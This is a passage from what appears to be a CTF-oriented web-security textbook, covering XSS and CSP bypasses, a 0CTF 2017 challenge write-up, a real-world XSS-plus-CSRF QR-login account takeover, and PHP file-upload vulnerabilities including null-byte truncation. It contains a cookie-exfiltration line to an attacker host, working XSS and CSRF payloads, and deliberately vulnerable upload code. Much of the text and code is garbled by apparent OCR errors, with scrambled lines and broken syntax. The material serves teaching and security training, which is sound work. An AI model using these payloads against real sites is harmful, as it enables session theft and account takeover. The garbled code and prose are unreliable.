144
2 Advanced Web
Fig. 2.87 Result
0ess′))
C127.0.0.1:8888
ss%20cspt%27)://
(( ,*oons, 1,e,)1//1( , 1dso *edlq, 142e[e
Fig, 2.88 Result
127.0.0.1:8888/xss/csp.php?url=jsonp.php%3fcallback=alert( (bypass%20csp1');//
127.0.0.1:8888
bypass csp!
Fig, 2.89 Result
In addition, we can use the JSONP command to bypass. Assuming there is a
JSONP interface (see Fig. 2.87), we can introduce code that conforms to JavaScript
syntax through the JSONP interface, as shown in Fig. 2.88.
If the JSONP interface is in the whitelist domain, you can inject malicious code
into the page by changing the callback parameter, and introduce the constructed link
on the trigger point page, as shown in Fig. 2.89.
Other common bypass methods are as follows:
 H5 preload, Only
 DNS preload
supported by Google Chrome
  n  n s    
generate link tags and transmit the data to our server, such as bringing out cookies
through GET parameters:
There is also the use of page jumps, including the jump of a tag, the jump of
location variable assignment, and the jump of meta tags. For example, to bring out
data by jumping:
location.hzef =*http : / /attacker com/?c="+escape (document . cookie)
---
## Page 161
2.3 The Magic of XSS
145
2.3.4 xSS Bypass Case
XSS challenges in CTF usually use XSS bot to simulate user access links from the
background, and then trigger the XSS constructed by the answerer, and read the flag
hidden in the bot browser by the challenge designer. The flag is usually in the cookie
of the bot browser, or exists in a path that can only be accessed by the identity of the
bot. In addition to the CTF challenge, there are also related XSS vulnerabilities in
reality. In the second example, I will explain a case of XSS vulnerabilities that I have
3np
1. 0CTF 2017 Complicated XSS
There are two domain names govermment.vip and admin.govermment.vip in the title,
as shown in Fig. 2.90.
Challenge reminder: http://admin.government.vip:8000. After the test, we found
that we can enter any HTML in the govermment.vip to trigger the BOT, which means
that the bot can execute any JavaScript code in the govemment.vip domain. After
further exploration found that
 You need to upload files to the http://admin.govemment.vip:8000/upload
 o ope ue se ae
  u sn a pue 0og:doue/d u Sx ue s  <>
user cookie will be directly displayed in the HTML content, as shown in
Fig. 2.91.
 The htp:/admin.govermment.vip:8000/ has fltering, and many functions have
been deleted. You need to find a way to bypass it in order to transmit the data. The
filtering part is as follows:
delete vindov.Function;
delete vindou.alert;
delete window.eval ;
XSSBook
he flag is in htg
Sant
Fig, 2.90 Task page
---
## Page 162
146
2 Advanced Web
Fig, 2.91 Task page
Hello test
Only admin can upload a shell
delete windou.XHLHttpRequest ;
delete vindov. Inage;
delete vindou.Proxy;
delete vindou-postMessage;
Based on the information obtained, we can sort out our ideas. Use the XSS of the
govemment.vip root domain to write the code for attacking the admin subdomain
into the Cookie, and set the valid domain of the Cookie to all subdomains (all
subdomains can access this Cookie). After setting the cookie, guide the user to visit
the page that prints the cookie, make the bot trigger XSS in the admin subdomain,
and use XSS to create a new iframe page in the admin subdomain after triggering,
thereby bypassing the function restrictions on the page and reading the HTML
source code of the page uploaded by the administrator, and finally construct the
upload package to trigger the upload using XSS, and send it to the attacker after
obtaining the flag.
Firstly, trigger the XSS content in the root domain:
function setCookie (name, value, seconds) {
seconds = seconds || 0;
/ / set seconds or 0, it's different with
php
var expires = ** ; if (seconds != 0) 
// set cookie expiration time
date .setTime [date .getTime () + (seconds*1oo0)1 ;
var date = new Date () ;
expires=*+date toGNTstring () ;
expires = * ;
document cookie = name+*-*+value+expires+*; path=/ :
domain=goveznment ,vipa ; // encode and assign ]
setCookie (' usernane* , *
var ifm = document . createElement (′iframe′) ;
' , 1000) ;
ifm.src = 'http: //admin. government . vip: 8ooo/ ' ;
document .body - appendchi1d (1fm) ;
Set the payload to the Cookie, and then guide the bot to visit the admin
subdomain. The malicious code can be used twice. The first time is to read the
HTML of the file uploaded by the administrator. The upload page read is shown in
Fig. 2.92.
After reading the source code, modify the payload structure, use JavaScript to
upload the file code, and after the upload is successful, send the page to its own
server. Finally, the server receives the request with the flag, as shown in Fig. 2.93
The flag is in the response to the uploaded file.
2. XSS for an Intermet company
sueup paepan-uodssed o are uoraduexasseddem pue uosaduexpodssed
of the company and are responsible for the user's passport-related tasks. For
example, carry the token to jump to other sub-domains for authorized login. The
wappass sub-domain is responsible for QR code login-related functions, and pass-
word changes can be made in this domain.
In the past, it was discovered that some URLs were not checked strictly, which
led to the security problem of redirecting to third-party domains with XXUSS.
XXUSS used to be their company’s only pass (HTTP Only Cookie). Since a certain
fix, the vulnerability of carrying the pass to jump seems to be completely repaired.
Upload your shel1
（ingut type=sulnit”ralue=upload”)
click me
As long as you click it, you can trigger the corresponding script, and then it seems
that I have seen an aftack payload:
document . 1ocation.href=*javascript : //ww.exanple com/$250aalert
(1) ";
---
## Page 165
2.3 The Magic of XSS
149
Such a payload can still be executed, because the *//* in JavaScript means a
comment. The attack statement runs to the second line through the following “%Oa"
newline character, avoiding this comment character. It seems that as long as it is a
JavaScript-type jump, can it trigger the JavaScript pseudo-protocol? Can the form
also be regarded as a way to carry data for JavaScript jumps?
The test code is as follows, and the result is shown in Fig. 2.94.
′);
attack.php?sign=
document . vrite (* >′> :* atyle=*display :none*>
The content of “attack.php" is as follows:
Fig, 2.96 Result
---
## Page 167
2.4 File Upload Vulnerability
151
$. get (*https : / /wappass example,com/wp/?
qrloginst=1526233652&error=0&sign=scmd=1ogins1p=pc&tpl=mn&uaonly=4client_id=sadapter=3&traceid=
$_GET [sign] ; ?
Params=1&suppcheck=1&scanface=1&support_
&1iveAbility=1&credentialKey=1sdeliver
photo=1', function (data)(
token = data.match(/token: *( [\w] +)  /) [1] ;
// alert (token+gign) :
s1gn = data .match(/s1gn: '( [\w] +) ′/) [1] ;
qr1ogin&v=1526234914892* , (*token* :token,
S-post (*https: //vappass. example.com/vp/?
sign, "authsid* :**, *tpl*:*mn*, *1p*:*pc", "traceid*:**↓) ;
"s1gn" :
}) ;
The above code is the final payload used. When the user visits this webpage, XSS
will be triggered, and the CSRF attack method is used to automatically authorize a
QR code login page opened by the attacker.
After the authorization is completed, the atacker can log in to the victim’s account
in the browser, and then browse various services as the other party.
2.4 File Upload Vulnerability
File upload is very common in web services, such as users uploading avatars, upload
pictures while writing the article, etc. When implementing file uploads, if the
backend does not properly process the files uploaded by users, it will cause very
serious security problems, such as malicious Trojan horses or junk files being
uploaded to the server. Because of its many categories, this section mainly intro-
duces some common upload problems in PHP.
2.4.1Basic File UploadVulnerability
Figure 2.97 is a basic PHP upload code, but there is a file upload vulnerability. PHP
file upload is usually implemented using the “move_uploaded_file”" method and the
"$_FILES" variable. The code in the figure directly uses the file name of the file
uploaded by the user as the file name saved in the server, which will cause arbitrary
file upload vulnerabilities. Therefore, malicious PHP script files can be uploaded to
the server (see Fig. 2.98).
---
## Page 168
152
qPM peouapy 
Fig, 2.97 PHP upload code
move_uploaded_file($file['tmp_name'], $file[ *nar
1）
l -F "file=e/tmp/x-php" -X "P0ST* http://Localhost/book/uplood.php
rl
Fig, 2.98 Result
2.4.2Truncate to BypassUpload Restrictions
2.4.2.1*00" Truncation
“00" truncation is a common way to bypass upload restrictions. In C language, "0"
is the end of the string. If the user can pass in *vo", it can be truncated.
The 0 truncation to bypass upload restrictions is suitable for the following
scenarios: the backend first obtains the file name of the file uploaded by the user,
ag a o Supuosoe _adg, xggns [ene a suenqo uap *adfoodudex, se uons
name; After passing the whitelist check of the suffix, the file name is finally truncated
when saving the file, and the uploaded file is *x.php".
The underlying code of PHP is C language, so there's this problem. However,
when PHP uses “S_FILES" to implement file uploads, there is no problem of *00"
truncation bypassing the upload restrictions, because PHP has already generated
truncation when registering the “S_FILES" global variable. Upload the file named
*dyd'x, s! [oueu,]S$, 01 paais3au aneA aqeueA aq pue *,sdfoodud'x,
the suffix obtained based on this value is °php*", so it cannot pass the whitelist check
of the suffix, The test screenshot is shown in Fig. 2.99 (The file name contains
invisible characters *"0").
Part of the call stack of PHP processing upload request is as follows:
Fig, 2.99 Result
---
## Page 169
2.4  File Upload Vulnerability
153
rfc1867_post_handler rfc1867.c:803
multipart_buffer_headers rfcl867.c:453
sapi_handle_post SAPI ,e:174
php_default_treat_data php_variables.c:423
php_auto_globals_create_post php_variables.c:720
usod9gi,o  p spenqu, 
method, and get the “header”" structure by processing the “mbuff' upload package:
If (!multipart_buffer_headers (mbuff, sheader) )(
goto fileupload_done;
The following code exists in the *multipart_buffer_headers” method:
while ((1ine = get_1ine [self)) && line [0] 1= *\o′) {
/+ add header to table */
char *value = NULL;
if (php_zfc1867_encoding_translation (1 ) {
self->input_encoding = zend_multibyte_encoding_detector ( (const
unsigned char *) line,
strlen (line) , self ->detect_order, self-
>detect_order_size) ;
/+ space in the beginning means sane header +/
if(1isspace (1ine [0])) {
value = stzchr (1ine, *:*) ;
if (value) (
if (buf_value.c && key) {
/* nev entry, add the old one to the 1ist
*/
smart_string_0 (4buf_value) ;
entry -key = key:
zend_11ist_add_element (header, &entry) :
entry.value = buf_value .c;
buf_value .c = NULL;
key = NULL ;
*value = *\0′ ;
do [
} vhi1e (1sspace (*value)) ;
value++ ;
key = estrdup (1ine) ;
smart_stxing_appends (&buf_value, value) ;
else if (buf_value,c) {
/+ If no ': ' on the line, add to previous
---
## Page 170
154
2 Advanced Web
1ine */
smart_string_appends (&buf_value, line) ;
else {
continue;
1
1f (buf_value .c && key) {
smart_string_0 (&buf_value) ;
/* add the last one to the list */
entry.value = buf_value .c;
entry-key = key:
zend_11ist_add_element (header, &entry) :
Read the data line by line from the *boundary", and use "" to separate the “key”
and “value”; when processing “filename”, the “key" is taken from “Content-Dispo-
sition", and the “value” is taken from *form-data; name=*file*;filename="a.phpv0.
jpg"*", then execute the following code:
smaxt_stxing_appends (4buf_value, value)
“smart_string_appends" is a macro definition function, which is equal to the
“memcpy" function. When “value” is copied to “&buf_value", "O" causes trunca-
tion. After truncation, add *buf_value.c” to the “entry”, and then add the “entry” to
the “°header” structure through “zend_Ilist_add_element”.
if ( (cd = php_mime_get_hdr_value (header, *Content -Disposition") ) ){
char *pa1r = NULL;